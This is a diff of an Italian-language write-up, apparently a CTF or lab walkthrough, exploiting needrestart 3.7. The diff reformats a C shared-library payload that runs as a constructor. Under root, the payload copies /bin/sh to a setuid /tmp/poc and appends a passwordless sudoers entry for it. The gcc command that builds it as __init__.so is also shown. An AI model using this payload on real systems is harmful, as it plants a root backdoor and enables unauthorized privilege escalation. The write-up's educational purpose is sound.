@@ -216,24 +216,24 @@ Con `needrestart --version` vediamo che la versione è la 3.7 che è soggetta al
   #include <stdlib.h>
   #include <sys/types.h>
   #include <unistd.h>
-  ```
+  
   
 
-static void a() __attribute__((constructor));
+  static void a() __attribute__((constructor));
 
-void a() {
- if(geteuid() == 0) { // Only execute if we're running with root privileges
- setuid(0);
- setgid(0);
- const char *shell = "cp /bin/sh /tmp/poc; "
- "chmod u+s /tmp/poc; "
- "grep -qxF 'ALL ALL=NOPASSWD: /tmp/poc' /etc/sudoers || "
- "echo 'ALL ALL=NOPASSWD: /tmp/poc' | tee -a /etc/sudoers > />
- system(shell);
- }
-}
+  void a() {
+      if(geteuid() == 0) { // Only execute if we're running with root privileges
+          setuid(0);
+          setgid(0);
+          const char *shell = "cp /bin/sh /tmp/poc; "
+                              "chmod u+s /tmp/poc; "
+                              "grep -qxF 'ALL ALL=NOPASSWD: /tmp/poc' /etc/sudoers || "
+                              "echo 'ALL ALL=NOPASSWD: /tmp/poc' | tee -a /etc/sudoers > />
+          system(shell);
+      }
+   }
+```
 
-````
 Compiliamo `lib.c` con il comando:
 `x86_64-linux-gnu-gcc -shared -fPIC -o __init__.so lib.c`
 per creare il file `__init__.so`
